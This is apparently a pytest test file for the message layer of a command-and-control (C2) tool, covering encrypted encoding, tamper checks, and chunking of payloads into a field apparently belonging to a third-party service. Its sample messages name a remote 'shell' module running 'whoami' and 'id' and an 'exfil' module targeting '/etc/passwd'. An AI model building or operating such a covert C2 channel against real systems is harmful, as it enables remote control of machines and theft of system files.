"""Tests for c2_protocol.py - C2 message serialization and chunking."""

import json

import pytest

from c2_protocol import (
    C2Message, CHANNEL_CMD, CHANNEL_RES,
    C2_EFFECTIVE_CHUNK,
    encode_message, decode_message,
    chunk_payload, reassemble_payload,
)


# --- C2Message Tests ---

class TestC2Message:
    def test_command_roundtrip(self):
        """Command dict serialization/deserialization."""
        msg = C2Message(module="shell", seq=1, args={"cmd": "whoami"})
        d = msg.to_command_dict()
        restored = C2Message.from_command_dict(d)
        assert restored.module == "shell"
        assert restored.seq == 1
        assert restored.args == {"cmd": "whoami"}

    def test_result_roundtrip(self):
        """Result dict serialization/deserialization."""
        msg = C2Message(
            module="shell", seq=1,
            status="ok", data="root\n"
        )
        d = msg.to_result_dict()
        restored = C2Message.from_result_dict(d)
        assert restored.module == "shell"
        assert restored.seq == 1
        assert restored.status == "ok"
        assert restored.data == "root\n"

    def test_command_dict_has_required_fields(self):
        """Command dict contains module, args, seq, ts."""
        msg = C2Message(module="exfil", seq=5,
                        args={"path": "/etc/passwd"})
        d = msg.to_command_dict()
        assert set(d.keys()) == {"module", "args", "seq", "ts"}
        assert d["module"] == "exfil"
        assert d["seq"] == 5

    def test_result_dict_has_required_fields(self):
        """Result dict contains seq, module, status, data, ts."""
        msg = C2Message(
            module="sysinfo", seq=3,
            status="ok", data='{"os":"Linux"}'
        )
        d = msg.to_result_dict()
        assert set(d.keys()) == {"seq", "module", "status", "data", "ts"}

    def test_default_args_empty(self):
        """Default args is empty dict."""
        msg = C2Message(module="sysinfo", seq=1)
        assert msg.args == {}

    def test_timestamp_set(self):
        """Timestamp is auto-set."""
        msg = C2Message(module="shell", seq=1)
        assert msg.ts > 0


# --- Encode/Decode Tests ---

class TestEncodeDecodeMessage:
    def test_roundtrip(self):
        """Encode then decode recovers original dict."""
        original = {"module": "shell", "args": {"cmd": "id"}, "seq": 1}
        encoded = encode_message(original, "test-key")
        decoded = decode_message(encoded, "test-key")
        assert decoded["module"] == "shell"
        assert decoded["args"]["cmd"] == "id"
        assert decoded["seq"] == 1

    def test_encrypted_output_differs(self):
        """Each encoding produces different output (random nonce)."""
        msg = {"module": "shell", "seq": 1}
        enc1 = encode_message(msg, "key")
        enc2 = encode_message(msg, "key")
        assert enc1 != enc2

    def test_wrong_key_fails(self):
        """Decoding with wrong key raises exception."""
        msg = {"module": "shell", "seq": 1}
        encoded = encode_message(msg, "correct-key")
        with pytest.raises(Exception):
            decode_message(encoded, "wrong-key")

    def test_integrity_verification(self):
        """Tampered payload fails integrity check."""
        msg = {"module": "shell", "seq": 1}
        encoded = encode_message(msg, "key")
        # Tamper with base64
        tampered = encoded[:-4] + "XXXX"
        with pytest.raises(Exception):
            decode_message(tampered, "key")

    def test_empty_data(self):
        """Message with empty data field encodes/decodes."""
        msg = {"module": "sysinfo", "seq": 1, "data": ""}
        encoded = encode_message(msg, "key")
        decoded = decode_message(encoded, "key")
        assert decoded["data"] == ""

    def test_unicode_data(self):
        """Unicode content survives encode/decode."""
        msg = {"module": "shell", "seq": 1,
               "data": "H\u00ebllo w\u00f6rld \u2603"}
        encoded = encode_message(msg, "key")
        decoded = decode_message(encoded, "key")
        assert decoded["data"] == "H\u00ebllo w\u00f6rld \u2603"

    def test_large_data(self):
        """Large data payloads encode/decode correctly."""
        msg = {"module": "exfil", "seq": 1, "data": "A" * 10000}
        encoded = encode_message(msg, "key")
        decoded = decode_message(encoded, "key")
        assert decoded["data"] == "A" * 10000

    def test_result_roundtrip(self):
        """Full result dict roundtrip."""
        original = {
            "seq": 42, "module": "shell",
            "status": "ok", "data": "uid=0(root)\n",
        }
        encoded = encode_message(original, "secret")
        decoded = decode_message(encoded, "secret")
        assert decoded["seq"] == 42
        assert decoded["status"] == "ok"
        assert decoded["data"] == "uid=0(root)\n"


# --- Chunking Tests ---

class TestChunkPayload:
    def test_small_payload_single_chunk(self):
        """Small payload fits in one chunk."""
        chunks = chunk_payload("shortdata", seq=1,
                               channel=CHANNEL_CMD)
        assert len(chunks) == 1
        data, meta_str = chunks[0]
        assert data == "shortdata"
        meta = json.loads(meta_str)
        assert meta["c"] == "cmd"
        assert meta["i"] == 1
        assert meta["seq"] == 1

    def test_large_payload_multi_chunk(self):
        """Large payload splits into multiple chunks."""
        payload = "X" * (C2_EFFECTIVE_CHUNK * 3 + 50)
        chunks = chunk_payload(payload, seq=5,
                               channel=CHANNEL_RES)
        assert len(chunks) == 4
        # Each chunk except last should be C2_EFFECTIVE_CHUNK
        for i, (data, _) in enumerate(chunks[:-1]):
            assert len(data) == C2_EFFECTIVE_CHUNK
        # Last chunk is the remainder
        assert len(chunks[-1][0]) == 50

    def test_metadata_format(self):
        """Metadata contains c, i, seq fields."""
        chunks = chunk_payload("data", seq=7, channel=CHANNEL_CMD)
        meta = json.loads(chunks[0][1])
        assert meta == {"c": "cmd", "i": 1, "seq": 7}

    def test_chunk_plus_meta_fits_chunk_size(self):
        """Each chunk + MARKER_SEP + meta fits within CHUNK_SIZE."""
        from spotapi import CHUNK_SIZE, MARKER_SEP
        payload = "Y" * (C2_EFFECTIVE_CHUNK * 2 + 10)
        chunks = chunk_payload(payload, seq=999,
                               channel=CHANNEL_RES)
        for data, meta_str in chunks:
            full_desc = data + MARKER_SEP + meta_str
            assert len(full_desc) <= CHUNK_SIZE

    def test_res_channel(self):
        """Result channel metadata uses 'res'."""
        chunks = chunk_payload("data", seq=1,
                               channel=CHANNEL_RES)
        meta = json.loads(chunks[0][1])
        assert meta["c"] == "res"


# --- Reassembly Tests ---

class TestReassemblePayload:
    def test_single_chunk(self):
        """Single chunk reassembles correctly."""
        chunk_metas = [("hello", {"c": "cmd", "i": 1, "seq": 1})]
        result = reassemble_payload(chunk_metas)
        assert result == "hello"

    def test_ordered_chunks(self):
        """Multiple chunks in order reassemble correctly."""
        chunk_metas = [
            ("AAA", {"i": 1}),
            ("BBB", {"i": 2}),
            ("CCC", {"i": 3}),
        ]
        result = reassemble_payload(chunk_metas)
        assert result == "AAABBBCCC"

    def test_unordered_chunks(self):
        """Out-of-order chunks are sorted by index."""
        chunk_metas = [
            ("CCC", {"i": 3}),
            ("AAA", {"i": 1}),
            ("BBB", {"i": 2}),
        ]
        result = reassemble_payload(chunk_metas)
        assert result == "AAABBBCCC"

    def test_chunk_reassemble_roundtrip(self):
        """chunk_payload + reassemble_payload recovers original."""
        original = "X" * 2000
        chunks = chunk_payload(original, seq=1,
                               channel=CHANNEL_CMD)
        # Convert to (data, meta_dict) format
        chunk_metas = [
            (data, json.loads(meta_str))
            for data, meta_str in chunks
        ]
        result = reassemble_payload(chunk_metas)
        assert result == original
